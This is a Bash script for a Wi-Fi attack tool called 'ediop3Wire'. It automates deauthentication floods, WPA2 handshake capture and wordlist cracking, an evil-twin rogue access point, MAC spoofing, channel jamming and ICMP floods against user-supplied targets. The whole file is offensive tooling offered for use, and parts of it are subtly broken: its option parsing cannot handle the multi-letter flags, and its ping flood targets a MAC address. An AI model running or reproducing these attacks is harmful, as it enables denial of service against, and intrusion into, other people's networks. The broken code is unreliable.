#!/bin/bash

# =======================================
# Made by ediop3
# =======================================

# Global variables for attack modes and configurations
INTERFACE="wlan0"
MONITOR_MODE="false"
CHANNEL="1"
LOG_DIR="/tmp/ediop3wire_logs"
TARGET_BSSID=""
TARGET_SSID=""
WORDLIST_FILE=""
ATTACK_MODE=""
NEW_MAC=""
HANDSHAKE_CAPTURED=false
DEAUTH_COUNT=1000
DEAUTH_INTERVAL=1
HANDSHAKE_FILE="/tmp/handshake.pcap"
SCAN_DURATION=60
FLOOD_COUNT=100
MAC_FLOOD_COUNT=100
JAMMER_FREQ="2400"
JAMMER_DURATION="60"
ICMP_FLOOD_COUNT=1000
ICMP_TARGET=""

# Check if necessary tools are installed
check_dependencies() {
    dependencies=(iw ifconfig ip tshark aireplay-ng hostapd aircrack-ng airodump-ng hcxdumptool hcxpcapngtool mdk4)
    for cmd in "${dependencies[@]}"; do
        if ! command -v "$cmd" &>/dev/null; then
            echo "Error: $cmd is not installed. Exiting..."
            exit 1
        fi
    done
}

# Enable monitor mode on the interface
start_monitor_mode() {
    ip link set $INTERFACE down
    iw dev $INTERFACE set type monitor
    ip link set $INTERFACE up
    MONITOR_MODE="true"
}

# Disable monitor mode and return to managed mode
stop_monitor_mode() {
    ip link set $INTERFACE down
    iw dev $INTERFACE set type managed
    ip link set $INTERFACE up
    MONITOR_MODE="false"
}

# Scan Wi-Fi networks and display SSID, BSSID, and other info
scan_networks() {
    airodump-ng $INTERFACE --output-format csv --write /tmp/scan_results --beacons
    cat /tmp/scan_results-01.csv | grep -E 'SSID|BSSID|channel' | while read line; do
        echo "$line"
    done
}

# Perform a ping flood attack on a target IP
ping_flood() {
    if [ -z "$TARGET_BSSID" ]; then
        exit 1
    fi
    ping -f $TARGET_BSSID
}

# Deauthentication attack
deauth_attack() {
    if [ -z "$TARGET_BSSID" ]; then
        exit 1
    fi
    aireplay-ng --deauth $DEAUTH_COUNT -a $TARGET_BSSID $INTERFACE
}

# Capture WPA2 handshake using Wi-Fi sniffing
capture_handshake() {
    if [ -z "$TARGET_BSSID" ]; then
        exit 1
    fi
    airodump-ng --bssid $TARGET_BSSID --channel $CHANNEL --write $HANDSHAKE_FILE $INTERFACE
    HANDSHAKE_CAPTURED=true
}

# WPA2 cracking using captured handshake
crack_wpa2() {
    if [ -z "$WORDLIST_FILE" ]; then
        exit 1
    fi
    if [ ! -f "$HANDSHAKE_FILE-01.cap" ]; then
        exit 1
    fi
    aircrack-ng $HANDSHAKE_FILE-01.cap -w $WORDLIST_FILE
}

# Fake AP (Evil Twin) attack using hostapd
rogue_ap() {
    read -p "Enter the SSID you want to spoof: " TARGET_SSID
    read -p "Enter the channel for the Rogue AP (1-13): " CHANNEL
    cat <<EOF > /tmp/hostapd.conf
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF
    hostapd /tmp/hostapd.conf &
    sleep 60
    kill $(pidof hostapd)
}

# MAC address spoofing
mac_spoof() {
    if [ -z "$NEW_MAC" ]; then
        exit 1
    fi
    ifconfig $INTERFACE down
    ifconfig $INTERFACE hw ether $NEW_MAC
    ifconfig $INTERFACE up
}

# MAC address flood attack
mac_flood_attack() {
    if [ -z "$TARGET_BSSID" ]; then
        exit 1
    fi
    aireplay-ng --deauth $MAC_FLOOD_COUNT -a $TARGET_BSSID $INTERFACE
}

# WPA2 handshake capture using hcxdumptool
capture_handshake_hcxdumptool() {
    if [ -z "$TARGET_BSSID" ]; then
        exit 1
    fi
    hcxdumptool -i $INTERFACE -o /tmp/handshake.pcapng --disable_keep_alive --enable_status=1 --filterlist_ap=$TARGET_BSSID
}

# WPA2 cracking using hcxpcapngtool
crack_wpa2_hcxpcapngtool() {
    if [ -z "$WORDLIST_FILE" ]; then
        exit 1
    fi
    if [ ! -f "/tmp/handshake.pcapng" ]; then
        exit 1
    fi
    hcxpcapngtool -o /tmp/cracked_hashes.hccapx /tmp/handshake.pcapng
    aircrack-ng /tmp/cracked_hashes.hccapx -w $WORDLIST_FILE
}

# Perform jammer attack on specific channel
jammer_attack() {
    if [ -z "$CHANNEL" ]; then
        exit 1
    fi
    mdk4 $INTERFACE b -c $CHANNEL -t $JAMMER_FREQ -d $JAMMER_DURATION
}

# Perform ICMP flood attack on a target
icmp_flood() {
    if [ -z "$ICMP_TARGET" ]; then
        exit 1
    fi
    ping $ICMP_TARGET -f -c $ICMP_FLOOD_COUNT
}

# Display available options in help message
display_help() {
    echo "███████╗██████╗░██╗░█████╗░██████╗░██████╗░"
    echo "██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗"
    echo "█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝"
    echo "██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗"
    echo "███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝"
    echo "╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░"
    echo ""
    echo "░██╗░░░░░░░██╗██╗██████╗░███████╗"
    echo "░██║░░██╗░░██║██║██╔══██╗██╔════╝"
    echo "░╚██╗████╗██╔╝██║██████╔╝█████╗░░"
    echo "░░████╔═████║░██║██╔══██╗██╔══╝░░"
    echo "░░╚██╔╝░╚██╔╝░██║██║░░██║███████╗"
    echo "░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝"
    echo ""
    echo "ediop3Wire: Made by ediop3"
    echo "Usage: ./ediop3wire.sh [OPTIONS]"
    echo "Options:"
    echo "  -s              Scan for Wi-Fi networks"
    echo "  -d              Perform deauthentication attack"
    echo "  -f              Perform Ping flood attack"
    echo "  -c              Capture WPA2 handshake"
    echo "  -w [wordlist]   Crack WPA2 password using a wordlist"
    echo "  -r              Perform Rogue AP (Evil Twin) attack"
    echo "  -m [new_mac]    Spoof MAC address to new_mac"
    echo "  -mf             Perform MAC address flood attack"
    echo "  -h              Display this help message"
    echo "  -chc            Capture WPA2 handshake using hcxdumptool"
    echo "  -wcrack         Crack WPA2 using hcxpcapngtool"
    echo "  -jam            Perform jammer attack on a channel"
    echo "  -icmp           Perform ICMP flood attack"
}

# Main function to parse command line arguments
main() {
    check_dependencies

    while getopts "sdfc:w:r:m:mf:hchjam:icmp:" opt; do
        case $opt in
            s)
                scan_networks
                ;;
            d)
                read -p "Enter target BSSID for Deauth attack: " TARGET_BSSID
                deauth_attack
                ;;
            f)
                read -p "Enter target BSSID for Ping flood attack: " TARGET_BSSID
                ping_flood
                ;;
            c)
                read -p "Enter target BSSID for Handshake capture: " TARGET_BSSID
                capture_handshake
                ;;
            w)
                WORDLIST_FILE=$OPTARG
                crack_wpa2
                ;;
            r)
                rogue_ap
                ;;
            m)
                NEW_MAC=$OPTARG
                mac_spoof
                ;;
            mf)
                read -p "Enter target BSSID for MAC flood attack: " TARGET_BSSID
                mac_flood_attack
                ;;
            chc)
                read -p "Enter target BSSID for Handshake capture using hcxdumptool: " TARGET_BSSID
                capture_handshake_hcxdumptool
                ;;
            wcrack)
                WORDLIST_FILE=$OPTARG
                crack_wpa2_hcxpcapngtool
                ;;
            jam)
                read -p "Enter channel for jammer attack: " CHANNEL
                jammer_attack
                ;;
            icmp)
                ICMP_TARGET=$OPTARG
                icmp_flood
                ;;
            h)
                display_help
                ;;
            *)
                display_help
                ;;
        esac
    done
}

# Run the main function
main "$@"
